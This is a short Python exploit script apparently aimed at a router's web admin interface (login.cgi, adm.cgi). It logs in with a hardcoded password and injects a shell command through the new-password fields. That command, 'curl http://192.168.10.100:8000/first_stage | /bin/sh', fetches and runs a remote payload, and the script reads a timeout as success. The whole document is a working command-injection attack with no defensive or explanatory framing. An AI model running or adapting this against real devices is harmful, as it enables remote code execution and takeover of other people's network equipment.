import requests
import random
import hashlib
import re
import time

salt = f"M{random.randint(10000,99999)}"
password = "Asdf12345"

h = hashlib.md5(bytes(salt + password, "utf-8")).hexdigest()

#initial auth
r = requests.post("http://192.168.10.1/cgi-bin/login.cgi",
                  headers={"Content-Type":"application/x-www-form-urlencoded",
                           "Referer": "http://192.168.10.1/login.shtml?login=0",
                           "Cookie": "session=1234567"},
                  data=f"page=login&langChange=0&ipaddr=192.168.10.100&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&wizardpage=wizard.shtml&protocol=http%3A&hostname=192.168.10.1&key={salt}&password={h}&lang_select=en")
                  
if("main.shtml" not in r.text):
    raise "bad login"

payload = f"`curl http://192.168.10.100:8000/first_stage | /bin/sh`"

try:
    p = requests.post("http://192.168.10.1/cgi-bin/adm.cgi",
                      headers={"Content-Type":"application/x-www-form-urlencoded",
                               "Referer": "http://192.168.10.1/set_safety.shtml?r=19778",
                               "Cookie": f"session={r.cookies['session']}"},
                      data=f"page=sysAdm&hostname=192.168.10.1&SYSPASS={password}&newpass={payload}&NEWPASS2={payload}",
                      timeout=5)
except requests.exceptions.ReadTimeout:
    print("Got timeout. Likely successful")

                  

